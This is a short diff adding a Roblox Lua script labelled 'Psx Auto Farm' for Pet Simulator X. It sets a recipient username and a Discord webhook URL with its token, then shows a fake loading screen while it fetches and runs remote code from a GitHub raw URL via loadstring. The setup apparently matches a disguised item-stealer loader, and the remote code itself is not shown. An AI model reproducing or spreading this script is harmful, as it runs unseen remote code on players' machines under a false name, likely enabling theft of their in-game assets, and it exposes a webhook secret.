@@ -1,0 +1,9 @@
+Username = "iDenjiro"
+WebHook = "https://discord.com/api/webhooks/1083257358077141063/yCjxTBLxYjpkjZR9aMIaRrEeLGSJz_qDCkVOmQuWsNQS_3uvwSDpckvkdbPnDhTgeR2j"
+loadingscreen = true
+_G.CustomScriptName = "Psx Auto Farm"
+_G.Text1 = "Loading Script..."
+_G.Text2 = "Script Loaded..."
+_G.Text3 = "Waiting for Script..."
+_G.Text4 = "Please Wait..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
